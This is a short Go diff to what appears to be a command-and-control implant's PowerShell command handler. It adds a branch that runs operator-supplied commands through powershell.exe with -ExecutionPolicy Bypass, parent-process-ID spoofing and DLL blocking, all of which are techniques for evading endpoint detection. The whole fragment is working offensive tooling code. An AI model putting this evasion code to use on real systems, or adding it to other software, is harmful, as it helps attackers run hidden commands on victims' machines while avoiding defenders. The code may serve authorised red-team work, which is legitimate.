@@ -71,6 +71,37 @@ func (c *PowershellCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	// Standard path — no impersonation
+	// Check for PPID spoofing or BlockDLLs — use extended attrs path
+	ppid := GetDefaultPPID()
+	if blockDLLsEnabled || ppid > 0 {
+		cmdLine := fmt.Sprintf(`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "%s"`, task.Params)
+		output, err := runWithExtendedAttrs(cmdLine, ppid, blockDLLsEnabled)
+		if err != nil {
+			outputStr := strings.TrimSpace(output)
+			if outputStr != "" {
+				return structs.CommandResult{
+					Output:    fmt.Sprintf("%s\nError: %v", outputStr, err),
+					Status:    "error",
+					Completed: true,
+				}
+			}
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error executing PowerShell: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		outputStr := strings.TrimSpace(output)
+		if outputStr == "" {
+			outputStr = "Command executed successfully (no output)"
+		}
+		return structs.CommandResult{
+			Output:    outputStr,
+			Status:    "success",
+			Completed: true,
+		}
+	}
+
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
 	defer cancel()
 
